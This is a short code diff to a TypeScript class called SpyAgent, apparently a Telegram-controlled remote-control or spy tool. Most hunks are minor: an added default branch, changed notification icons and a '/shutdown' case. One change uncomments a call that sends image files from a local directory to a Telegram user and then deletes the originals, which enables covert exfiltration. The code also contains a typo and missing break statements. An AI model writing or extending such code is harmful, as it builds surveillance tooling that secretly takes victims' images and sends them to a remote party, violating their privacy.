@@ -126,6 +126,8 @@ export default class SpyAgent {
                     if (error) return console.log(error);
                     console.log(stdout);
                 });
+            default:
+                console.log('Unknows os detected');
         }
     }
 
@@ -157,7 +159,7 @@ export default class SpyAgent {
                 this.notifier.notify({
                     title: "Helllllo Buddy! ",
                     message: actions.text,
-                    icon: path.join(process.cwd(), 'assets', 'hello.webp'),
+                    icon: path.join(process.cwd(), 'assets', 'hello.png'),
                 });
                 break;
             case "/shutdown":
@@ -167,7 +169,7 @@ export default class SpyAgent {
                 this.notifier.notify({
                     title: "Helllllo Buddy! ",
                     message: actions.text,
-                    icon: path.join(process.cwd(), 'assets', 'hello.webp'),
+                    icon: path.join(process.cwd(), 'assets', 'hello.png'),
                 });
             default:
                 console.log('Hu!');
@@ -183,7 +185,7 @@ export default class SpyAgent {
                     const file = this.getFirstFile();
                     if (file === '') return;
                     const image = path.join(process.cwd(), process.env.FILE_DIR!, file);
-                    // await this._bot.telegram.sendPhoto(this.userName!, { source: image });
+                    await this._bot.telegram.sendPhoto(this.userName!, { source: image });
                     unlinkSync(path.join(process.cwd(), process.env.FILE_DIR!, file));
                     this.dequeue();
                 }
